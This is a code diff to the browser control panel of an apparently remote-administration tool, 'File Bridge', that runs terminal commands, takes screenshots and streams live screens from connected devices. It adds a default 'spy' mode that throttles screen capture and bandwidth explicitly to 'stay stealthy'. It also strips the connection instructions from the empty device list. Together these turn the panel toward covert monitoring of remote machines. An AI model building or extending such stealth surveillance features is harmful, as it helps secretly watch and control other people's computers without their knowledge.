@@ -30,6 +30,13 @@ let screenshotQuality = 30;
 let audioEnabled = false;
 let isStreaming = false;
 
+// ---- Mode ----
+let appMode = localStorage.getItem('fb_mode') || 'spy';        // 'spy' | 'normal'
+let spyBandwidthKbps = Number(localStorage.getItem('fb_spy_bw') || '50');
+
+const SPY_STREAM_PRESET = { quality: 10, fps: 1, resolution: 0.2 };
+const SPY_SCREENSHOT_QUALITY = 20;
+
 const STREAM_PRESETS = {
     eco: { quality: 25, fps: 6, resolution: 0.45 },
     balanced: { quality: 45, fps: 10, resolution: 0.6 },
@@ -57,6 +64,102 @@ const QUICK_PATHS = {
 
 const textExts = ['txt', 'md', 'log', 'json', 'js', 'ts', 'css', 'html', 'py', 'bat', 'cmd', 'ini', 'conf', 'xml', 'csv', 'yml', 'yaml'];
 const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg', 'webp'];
+
+// ============================================================
+// MODE — SPY / NORMAL
+// ============================================================
+
+function setAppMode(mode) {
+    appMode = mode;
+    localStorage.setItem('fb_mode', mode);
+    applyModeToUi();
+    if (mode === 'spy' && isStreaming) applySpyParamsToStream();
+}
+
+function setSpyBandwidth(kbps) {
+    spyBandwidthKbps = Math.max(10, Math.min(10000, Number(kbps) || 50));
+    localStorage.setItem('fb_spy_bw', String(spyBandwidthKbps));
+    if (appMode === 'spy' && isStreaming) applySpyParamsToStream();
+}
+
+function applyModeToUi() {
+    const isSpy = appMode === 'spy';
+    document.body.classList.toggle('spy-mode', isSpy);
+
+    const spyBtn = $('modeSpyBtn');
+    const normalBtn = $('modeNormalBtn');
+    if (spyBtn) spyBtn.classList.toggle('active', isSpy);
+    if (normalBtn) normalBtn.classList.toggle('active', !isSpy);
+
+    const bwRow = $('bwLimitRow');
+    if (bwRow) bwRow.style.display = isSpy ? 'flex' : 'none';
+
+    const bwMeter = $('bwMeter');
+    if (bwMeter) bwMeter.style.display = isSpy ? 'flex' : 'none';
+
+    const modeLabel = $('modeLabel');
+    if (modeLabel) {
+        modeLabel.textContent = isSpy ? 'SPY' : 'NORMAL';
+        modeLabel.className = 'mode-label ' + appMode;
+    }
+
+    updateBwMeter(liveStats.bitrate || 0);
+}
+
+function updateBwMeter(currentKbps) {
+    if (appMode !== 'spy') return;
+    const bar = $('bwMeterBar');
+    const label = $('bwMeterLabel');
+    if (!bar || !label) return;
+    const pct = Math.min(100, Math.round((currentKbps / spyBandwidthKbps) * 100));
+    bar.style.width = pct + '%';
+    bar.className = 'bw-meter-bar' + (pct > 90 ? ' over' : pct > 70 ? ' warn' : '');
+    label.textContent = currentKbps + ' / ' + spyBandwidthKbps + ' kbps';
+}
+
+function applySpyParamsToStream() {
+    if (!liveStreamId || !isStreaming) return;
+    sendCommand('adjust_stream', {
+        streamId: liveStreamId,
+        quality: SPY_STREAM_PRESET.quality,
+        fps: SPY_STREAM_PRESET.fps,
+        resolution: SPY_STREAM_PRESET.resolution
+    });
+    $('streamQuality').value = SPY_STREAM_PRESET.quality;
+    $('streamFps').value = SPY_STREAM_PRESET.fps;
+    $('streamResolution').value = SPY_STREAM_PRESET.resolution;
+}
+
+function adaptiveSpyThrottle(currentKbps) {
+    if (appMode !== 'spy' || !isStreaming || !liveStreamId) return;
+    const now = performance.now();
+    if (now - liveStats.lastAdaptiveAt < 3000) return;
+    liveStats.lastAdaptiveAt = now;
+
+    const limit = spyBandwidthKbps;
+    const q = Number($('streamQuality').value);
+    const fps = Number($('streamFps').value);
+    const res = Number($('streamResolution').value);
+
+    let newQ = q, newFps = fps, newRes = res;
+
+    if (currentKbps > limit * 1.15) {
+        // Over budget — step down aggressively
+        if (newFps > 1) newFps = Math.max(1, newFps - 1);
+        else if (newQ > 10) newQ = Math.max(10, newQ - 5);
+        else if (newRes > 0.2) newRes = Math.max(0.2, Math.round((newRes - 0.05) * 100) / 100);
+    } else if (currentKbps < limit * 0.5 && currentKbps > 0) {
+        // Well under budget — allow tiny quality increase (stay stealthy)
+        if (newQ < 20) newQ = Math.min(20, newQ + 2);
+    }
+
+    if (newQ !== q || newFps !== fps || newRes !== res) {
+        sendCommand('adjust_stream', { streamId: liveStreamId, quality: newQ, fps: newFps, resolution: newRes });
+        $('streamQuality').value = newQ;
+        $('streamFps').value = newFps;
+        $('streamResolution').value = newRes;
+    }
+}
 
 function $(id) {
     return document.getElementById(id);
@@ -343,7 +446,7 @@ function renderPCList() {
     $('totalCount').textContent = Object.keys(clients).length;
 
     if (ids.length === 0) {
-        $('pcList').innerHTML = '<div class="drop-target"><strong>No devices connected</strong><br>Run the File Bridge client on remote devices to connect them to this server.<br><br><span style="color:var(--muted)">Connection: ws://[server-address]/ws</span></div>';
+        $('pcList').innerHTML = '<div class="drop-target"><strong>No devices connected</strong></div>';
         return;
     }
 
@@ -983,7 +1086,8 @@ function showNewFolderModal() {
 
 function takeScreenshot() {
     $('screenshotContainer').innerHTML = '<div class="loading"><div class="spinner"></div><div>Capturing screen...</div></div>';
-    sendCommand('take_screenshot', { quality: screenshotQuality });
+    const quality = appMode === 'spy' ? SPY_SCREENSHOT_QUALITY : screenshotQuality;
+    sendCommand('take_screenshot', { quality });
 }
 
 function renderScreenshotEmpty() {
@@ -1129,10 +1233,19 @@ function startLiveStream() {
     resetLiveStats();
     ensureLiveStage();
 
-    const quality = Number($('streamQuality').value) || 35;
-    const fps = Number($('streamFps').value) || 8;
-    const resolution = Number($('streamResolution').value) || 0.5;
+    let quality = Number($('streamQuality').value) || 35;
+    let fps = Number($('streamFps').value) || 8;
+    let resolution = Number($('streamResolution').value) || 0.5;
     const monitor = Number($('streamMonitor').value) || 0;
+
+    if (appMode === 'spy') {
+        quality = SPY_STREAM_PRESET.quality;
+        fps = SPY_STREAM_PRESET.fps;
+        resolution = SPY_STREAM_PRESET.resolution;
+        $('streamQuality').value = quality;
+        $('streamFps').value = fps;
+        $('streamResolution').value = resolution;
+    }
 
     sendCommand('start_live_stream', {
         streamId: liveStreamId,
@@ -1429,6 +1542,8 @@ function updateLiveStats(base64Length, instantFps) {
         liveStats.lastStatsAt = now;
         $('liveFpsStat').textContent = liveStats.fps + ' fps';
         $('liveBitrateStat').textContent = liveStats.bitrate + ' kbps';
+        updateBwMeter(liveStats.bitrate);
+        adaptiveSpyThrottle(liveStats.bitrate);
     } else if (instantFps) {
         liveStats.fps = instantFps;
     }
@@ -1699,6 +1814,61 @@ function wireUi() {
             $('topbarActions').classList.remove('open');
         }
     });
+
+    const appShell = $('app');
+    function openSidebar() {
+        appShell.classList.add('sidebar-open');
+        appShell.classList.remove('sidebar-closed');
+    }
+    function closeSidebar() {
+        appShell.classList.remove('sidebar-open');
+        appShell.classList.add('sidebar-closed');
+    }
+    function toggleSidebar() {
+        if (appShell.classList.contains('sidebar-open') || appShell.classList.contains('sidebar-closed')) {
+            appShell.classList.toggle('sidebar-open');
+            appShell.classList.toggle('sidebar-closed');
+        } else {
+            // Default state: sidebar visible on desktop, hidden on mobile
+            if (window.innerWidth <= 760) {
+                openSidebar();
+            } else {
+                closeSidebar();
+            }
+        }
+    }
+    if ($('sidebarToggle')) {
+        $('sidebarToggle').addEventListener('click', () => {
+            if (window.innerWidth <= 760) {
+                openSidebar();
+            } else {
+                toggleSidebar();
+            }
+        });
+    }
+    if ($('sidebarCloseToggle')) {
+        $('sidebarCloseToggle').addEventListener('click', () => {
+            if (window.innerWidth <= 760) {
+                closeSidebar();
+            } else {
+                closeSidebar();
+            }
+        });
+    }
+    // Close sidebar when clicking overlay on mobile
+    document.addEventListener('click', event => {
+        if (window.innerWidth <= 760 && appShell.classList.contains('sidebar-open')) {
+            if (!event.target.closest('.sidebar') && !event.target.closest('#sidebarToggle')) {
+                closeSidebar();
+            }
+        }
+    });
+    // Close sidebar on escape key
+    document.addEventListener('keydown', event => {
+        if (event.key === 'Escape') {
+            closeSidebar();
+        }
+    });
     $('refreshClientsButton').addEventListener('click', fetchClients);
     $('pcSearch').addEventListener('input', renderPCList);
     $('quickPingButton').addEventListener('click', () => sendCommand('ping'));
@@ -1849,6 +2019,13 @@ function wireUi() {
     $('terminalOutput').innerHTML = '<div class="cmd-muted">Terminal ready. Type a command and press Enter.</div>';
     renderScreenshotEmpty();
     renderLiveEmpty();
+
+    // Mode wiring
+    $('modeSpyBtn').addEventListener('click', () => setAppMode('spy'));
+    $('modeNormalBtn').addEventListener('click', () => setAppMode('normal'));
+    $('bwLimitInput').value = spyBandwidthKbps;
+    $('bwLimitInput').addEventListener('change', () => setSpyBandwidth($('bwLimitInput').value));
+    applyModeToUi();
 }
 
 document.addEventListener('DOMContentLoaded', () => {
